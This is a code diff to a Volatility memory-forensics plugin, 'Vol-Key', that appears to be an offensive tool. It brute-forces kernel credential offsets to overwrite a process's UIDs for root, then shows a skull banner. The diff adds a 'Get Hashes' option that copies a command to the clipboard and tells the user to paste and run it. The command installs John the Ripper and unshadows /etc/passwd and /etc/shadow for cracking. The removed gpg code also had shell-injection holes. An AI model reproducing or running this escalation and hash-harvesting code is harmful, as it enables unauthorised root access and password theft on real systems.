@@ -8,12 +8,11 @@ import volatility.plugins.taskmods as taskmods
 import volatility.plugins.linux.common as linux_common
 import subprocess as sp
 import re
-from charInput import readIn
 from volatility.renderers import TreeGrid
 from volatility.renderers.basic import Address
 from subprocess import Popen, PIPE
 import shlex
-
+import os
 
 
 class linux_volkey(linux_common.AbstractLinuxCommand):
@@ -198,7 +197,7 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                        Address(dtb),
                        start_time])
 
-    def skull():
+    def skull(self):
         print('''
                              uuuuuuu
                          uu$$$$$$$$$$$uu
@@ -233,21 +232,22 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
 
                      Welcome to Vol-Key
         ''')
-    def keyMenu():
+    def keyMenu(self):
         print("""
-    1. Make Key
+    1. Get Hashes
     e. Exit
         """)
 
-    def readIn(validSelec):
-    while(1):
-        temp = readchar.readkey()
-        if len(temp) ==1: #this will ignore special keys that require >1 byte (arrow keys, modifiers,ect.)
-            if temp in validSelec:
-                time.sleep(.2) #added a sleep by request of tester who said it was "too quick"
-                return temp
-    print("fatal flaw on read")
-    sys.exit(2) #error code 2 for standard input error code                                                                                    
+    def readIn(self,validSelec):
+        while(1):
+            temp = str(input('--> '))
+            if len(temp) ==1: #this will ignore special keys that require >1 byte (arrow keys, modifiers,ect.)
+                if temp in validSelec:
+                    return temp
+                else:
+                    print("Input not valid option\n")
+        print("fatal flaw on read")
+        sys.exit(2) #error code 2 for standard input error code                                                                                    
     def render_text(self, outfd, data):
         self.table_header(outfd, [("Offset", "[addrpad]"),
                                   ("Name", "20"),
@@ -272,42 +272,38 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                 print "running exploit..."
                 vals = self._get_cred_offsets_brute(task.pid)
                 # print vals
+                #success = True
                 success = self._overwrite_UIDs(vals)
                 if success:
                     print "got root...probably"
-                    skull();
-                    keyMenu();
+                    self.skull();
+                    self.keyMenu();
                     print("select an option:")
                     keySelec = ['e','1']
-                    ans=readIn(keySelec)
+                    ans=self.readIn(keySelec)
                     print("option selected: "+ans+"\n")
-                            if ans=="1": # generate keys    
-                                os.system("gpg --gen-key")
-                                #os.system("ls; exec bash") to leave the shell open
-                            elif ans=="2": # list keys
-                                os.system("gpg --list-keys")
-                            elif ans=="3": # delete key
-                                username=raw_input("Whose key would you like to remove from your keyring?\n")
-                                os.system('gpg --delete-key "'+username+'"')
-                            elif ans=="4": # delete secret key
-                                os.system("gpg --list-secret-keys")
-                                username=raw_input("Whose secret key would you like to remove from your secret keyring?\n")
-                                os.system('gpg --delete-secret-key "'+username+'"')
-                            elif ans=="5": # export key
-                                username=raw_input("Enter Username/ID associated with key:\n")
-                                file=username.replace(" ", "")
-                                os.system('gpg --export -a "'+username+'" > '+file+'.key')
-                            elif ans=="6": # import key
-                                os.system("ls *.key")
-                                file=raw_input("From which file would you like to import the key?\n")
-                                os.system("gpg --import "+file) 
-                            elif ans=="e":
-                                print("\n Goodbye")
-                                ans=None
-                            elif ans=="<":
-                                pass
-                            else:
-                                print("\n Pick a Real Option.") 
+                    if ans=="1": # generate keys
+                        data = "apt update && apt install john -y && unshadow /etc/passwd /etc/shadow > crackMe.txt ; ls"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
+                    elif ans=="2": # list keys
+                        pass
+                    elif ans=="3": # delete key
+                        pass
+                    elif ans=="4": # delete secret key
+                        pass
+                    elif ans=="5": # export key
+                        pass
+                    elif ans=="6": # import key
+                        pass
+                    elif ans=="e":
+                        print("\n Goodbye")
+                        ans=None
+                    elif ans=="<":
+                        pass
+                    else:
+                        print("\n Pick a Real Option.") 
 
 
 
